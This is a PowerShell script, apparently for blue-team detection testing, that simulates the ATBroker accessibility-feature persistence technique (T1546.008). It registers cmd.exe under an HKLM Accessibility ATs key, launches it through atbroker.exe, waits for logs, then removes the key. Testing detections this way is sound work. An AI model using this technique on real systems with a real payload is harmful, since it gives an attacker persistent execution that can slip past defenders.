# ATBroker_PoC.ps1


Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "[*] BAT DAU MO PHONG KY THUAT ATBROKER (T1546.008)" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan

$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"
$payloadPath = "C:\Windows\System32\cmd.exe"

# Bước 1: Tạo Persistence
Write-Host "`n[+] Buoc 1: Them Registry Key de thiet lap Persistence..." -ForegroundColor Yellow
try {
    New-Item -Path $registryPath -Force -ErrorAction Stop | Out-Null
    New-ItemProperty -Path $registryPath -Name "StartExe" -Value $payloadPath -PropertyType String -Force -ErrorAction Stop | Out-Null
    Write-Host "    -> Da tao thanh cong key: ATs\malware_test" -ForegroundColor Green
} catch {
    Write-Host "    -> [Loi] Khong the tao Registry. Hay chac chan ban dang chay bang quyen Administrator!" -ForegroundColor Red
    Exit
}

# Bước 2: Kích hoạt ATBroker
Write-Host "`n[+] Buoc 2: Kich hoat atbroker.exe de thuc thi payload..." -ForegroundColor Yellow
try {
    Start-Process -FilePath "atbroker.exe" -ArgumentList "/start malware_test" -ErrorAction Stop
    Write-Host "    -> Tien trinh da duoc goi." -ForegroundColor Green
} catch {
    Write-Host "    -> [Loi] Khong the chay atbroker.exe" -ForegroundColor Red
}

# Dừng vài giây để hệ thống kịp ghi nhận log Sysmon và Security
Write-Host "`n[*] Dang doi 5 giay de he thong ghi nhan log..." -ForegroundColor Gray
Start-Sleep -Seconds 5

# Bước 3: Dọn dẹp dấu vết
Write-Host "`n[+] Buoc 3: Don dep (Clean-up) Registry..." -ForegroundColor Yellow
try {
    Remove-Item -Path $registryPath -Recurse -Force -ErrorAction Stop
    Write-Host "    -> Da xoa thanh cong key ATs\malware_test. Moi truong da sach!" -ForegroundColor Green
} catch {
    Write-Host "    -> [Loi] Khong the xoa Registry." -ForegroundColor Red
}

Write-Host "`n======================================================" -ForegroundColor Cyan
Write-Host "[*] HOAN THANH POC! BAN HAY KIEM TRA LOG VA ALERT." -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan
